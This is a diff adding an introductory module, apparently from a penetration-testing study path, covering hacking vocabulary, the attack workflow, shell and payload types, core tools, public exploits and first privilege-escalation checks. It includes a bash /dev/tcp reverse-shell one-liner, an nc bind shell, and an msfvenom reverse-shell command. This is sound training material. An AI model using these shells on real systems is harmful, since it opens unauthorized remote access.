@@ -1,0 +1,197 @@
+---
+title: "2 · Getting Started"
+---
+
+<Info>
+**What this module is about**
+
+The foundational concepts the whole path builds on: infosec vocabulary, how a hack actually flows, the difference between shell types and payload types, the core tools, how to find and use public exploits, and a first taste of privilege escalation. If you understand this note, the later modules are just depth on each step.
+</Info>
+
+---
+
+## Core terminology
+
+| Term | Meaning |
+|------|---------|
+| **Vulnerability** | A weakness (bug, misconfig, weak password) that can be abused |
+| **Exploit** | Code/technique that abuses a vulnerability |
+| **Payload** | What runs *after* the exploit lands (e.g. a shell) |
+| **CVE** | Unique ID for a publicly known vulnerability (e.g. CVE-2019-19781) |
+| **CVSS** | 0–10 severity score for a vulnerability |
+| **Foothold** | Your first access into a target |
+| **Privilege escalation** | Going from low-priv user → root/SYSTEM/admin |
+| **Lateral movement** | Using one host to reach another |
+| **Enumeration** | Systematically gathering info about a target — the skill that matters most |
+
+<Tip>
+**The #1 lesson of the whole course: **enumeration > exploitation.** Most boxes fall because you found something (a file, a version, a creds reuse), not because you wrote a clever exploit. When stuck, you almost always haven't enumerated enough.**
+
+</Tip>
+
+---
+
+## The hacking process (how a box actually goes)
+
+```
+Enumerate → find a weakness → get a foothold (shell) →
+   re-enumerate as that user → escalate privileges →
+   loot / pivot → repeat
+```
+
+This mirrors the [Penetration Testing Process Cheat Sheet](/getting-started/penetration-testing-process-cheat-sheet) lifecycle, applied to a single machine. The loop is the point: **every time you get new access, you enumerate again** from the new position.
+
+---
+
+## Networking essentials you must know
+
+- **IP address** identifies a host; **port** identifies a service on it (0–65535).
+- **TCP** = reliable, connection-oriented (3-way handshake SYN → SYN/ACK → ACK). Most services.
+- **UDP** = connectionless, fire-and-forget (DNS, SNMP, TFTP). Easy to miss when scanning.
+- **Ports to know cold:** see **[Master Protocol & Service Quick Reference](/reference/master-protocol-service-quick-reference)** — that note is your port/service lookup.
+
+<Info>
+**Why ports matter**
+
+Each open port is a door = a potential attack surface. The first real step on any target is "which doors are open and what's behind them?" → that's Nmap (**[Network Enumeration with Nmap Cheat Sheet](/recon/network-enumeration-with-nmap-cheat-sheet)**).
+</Info>
+
+---
+
+## Shells — the heart of "access"
+
+A **shell** is interactive command execution on the target. Three kinds, and knowing *when* to use each is essential:
+
+| Shell type | Who connects to whom | When to use |
+|-----------|----------------------|-------------|
+| **Reverse shell** | **Target connects back to you** (you listen) | Default choice — usually beats outbound firewalls; most common |
+| **Bind shell** | **You connect to the target** (target listens) | When the target can't reach back out but you can reach it |
+| **Web shell** | Commands via a web page (e.g. uploaded `.php`) | After a file-upload / LFI on a web app |
+
+```bash
+# Reverse shell: attacker listens, target connects back
+nc -lvnp 4444                       # on YOUR box
+bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1   # on the TARGET
+
+# Bind shell: target listens, you connect in
+nc -lvnp 4444 -e /bin/bash          # on the TARGET
+nc <TARGET_IP> 4444                  # on YOUR box
+```
+
+<Info>
+**Reverse vs bind — the mental rule**
+
+Outbound traffic is usually allowed; inbound is usually filtered. So a **reverse** shell (target dials out to you) succeeds far more often than a **bind** shell (you dial into the target). Reach for reverse first. Full depth: **[Shells & Payloads Cheat Sheet](/exploitation/shells-payloads-cheat-sheet)**.
+</Info>
+
+<Tip>
+**Stabilize a raw shell so it doesn't die on Ctrl-C and supports tab/arrows:**
+
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'   # then Ctrl-Z
+stty raw -echo; fg                                # on your box
+export TERM=xterm
+```
+</Tip>
+
+---
+
+## Payloads — staged vs stageless
+
+A payload is the code that runs after exploitation. Two delivery styles:
+
+- **Stageless** — the whole payload ships at once. Bigger, but self-contained and reliable (good when you only get one shot).
+- **Staged** — a tiny **stager** lands first, then pulls the rest ("stage") over the network. Smaller initial footprint; needs a working callback. Metasploit names them with `/` vs `_`:
+  - `windows/x64/meterpreter/reverse_tcp` = **staged**
+  - `windows/x64/meterpreter_reverse_tcp` = **stageless**
+
+Generate payloads with **msfvenom** (see **[Metasploit Framework Cheat Sheet](/exploitation/metasploit-framework-cheat-sheet)**):
+
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf
+```
+
+---
+
+## The essential toolset
+
+| Need | Tool |
+|------|------|
+| Port/service scanning | `nmap` → **[Network Enumeration with Nmap Cheat Sheet](/recon/network-enumeration-with-nmap-cheat-sheet)** |
+| Web dir/vhost fuzzing | `ffuf`, `gobuster` |
+| Web tech fingerprint | `whatweb`, `nikto`, `curl -I` |
+| Exploit framework | Metasploit → **[Metasploit Framework Cheat Sheet](/exploitation/metasploit-framework-cheat-sheet)** |
+| Catch shells / transfer | `nc`, `python3 -m http.server` → **[File Transfers Cheat Sheet](/post-exploitation/file-transfers-cheat-sheet)** |
+| Cracking / spraying | `hashcat`, `john`, `hydra`, `netexec` → **[Password Attacks Cheat Sheet](/password-attacks/password-attacks-cheat-sheet)** |
+| SMB/Windows enum | `smbclient`, `smbmap`, `netexec`, `rpcclient` |
+| Terminal multiplexing | `tmux` → **[Terminal_Tmux_Zsh_Cheatsheet](/cheatsheets/terminal-tmux-zsh-cheatsheet)** |
+
+---
+
+## Finding & using public exploits
+
+<Info>
+**Workflow once you know a service + version**
+
+1. Identify the exact product **and version** (banner, `nmap -sV`, page footer).
+2. Search for a known exploit.
+3. **Read the exploit before running it** — understand what it does, fix IP/port/paths, never blindly run untrusted code.
+</Info>
+
+```bash
+searchsploit <product> <version>        # offline Exploit-DB
+searchsploit -m <id>                     # copy an exploit locally to edit
+# also: exploit-db.com, GitHub, the CVE write-up itself
+```
+
+In Metasploit: `search <product>` then `use <module>`. Always check `show options`.
+
+<Warning>
+**Public exploit code can be malicious or destructive. Read it, understand the payload, and prefer running risky PoCs in a controlled VM.**
+
+</Warning>
+
+---
+
+## First look at privilege escalation
+
+After a foothold you're usually a **low-privileged** user. Escalation = abusing a misconfiguration to become root/SYSTEM. The first moves:
+
+```bash
+# Linux
+sudo -l                       # what can I run as root?
+id; whoami
+find / -perm -4000 2>/dev/null   # SUID binaries
+uname -a                      # kernel version (kernel exploits)
+
+# Windows
+whoami /priv                  # dangerous privileges?
+systeminfo                    # patch level / OS
+```
+
+Run an enumeration script to automate the hunt (`linpeas.sh` / `winPEAS.exe`). Full checklists: **[Linux_PrivEsc_Checklist](/privesc/linux-privesc-checklist)** and **[Windows_PrivEsc_Checklist](/privesc/windows-privesc-checklist)**.
+
+<Tip>
+**Same principle as enumeration generally: the privesc path is almost always *information you can find on the box* — a password in a config, a writable service, a sudo rule — not a 0-day.**
+
+</Tip>
+
+---
+
+## Mental model
+
+```
+"I have a target IP and nothing else."
+        ↓
+nmap → open ports/services/versions
+        ↓
+per service: what is it? version? known exploit? misconfig? creds?
+        ↓
+get a shell (reverse first) and STABILIZE it
+        ↓
+enumerate as this user → escalate → loot → pivot
+        ↓
+when stuck → you haven't enumerated enough. Go back.
+```
+
+Next module → **[Network Enumeration with Nmap Cheat Sheet](/recon/network-enumeration-with-nmap-cheat-sheet)**.
